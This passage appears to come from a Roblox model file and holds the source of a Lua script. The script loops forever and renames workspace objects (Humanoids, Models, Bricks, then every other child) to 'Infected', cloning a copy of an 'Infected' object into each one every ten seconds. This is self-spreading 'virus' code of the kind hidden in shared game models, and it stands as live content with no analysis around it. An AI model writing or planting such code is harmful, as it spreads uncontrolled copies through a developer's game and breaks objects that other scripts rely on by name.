						<string name="Source">model = script.Parent -- Sets the model variable to the script&apos;s parent, this way we don&apos;t have to manually set model names.



function Infector()
while true do -- Infinite loop
	found = game.Workspace:FindFirstChild(&quot;Humanoid&quot;)
	found2 = game.Workspace:FindFirstChild(&quot;Model&quot;)
	found3 = game.Workspace:FindFirstChild(&quot;Brick&quot;)
	if found ~= nil then
		found.Name=&quot;Infected&quot;
		infectedscr = model.Infected:Clone()
		infectedscr.Parent = found
	else
	if found2 ~= nil then
		found2.Name = &quot;Infected&quot;
		infectedscr2 = model.Infected:Clone()
		infectedscr2.Parent = found2
	else
	if found3 ~= nil then
		found3.Name = &quot;Infected&quot;
		infectedscr3 = model.Infected:Clone()
		infectedscr3.Parent = found3
	else
	local children = game.Workspace:GetChildren()
	for c = 1, #children do
		
		if children[c].Name ~= &quot;Infected&quot;
		then
		children[c].Name = &quot;Infected&quot;
		infectedscr421 = model.Infected:Clone()
		infectedscr421.Parent = children[c]
		else
		end
		
	end
	end
	end
	
	end
	wait(10)
end
end
 
Infector()
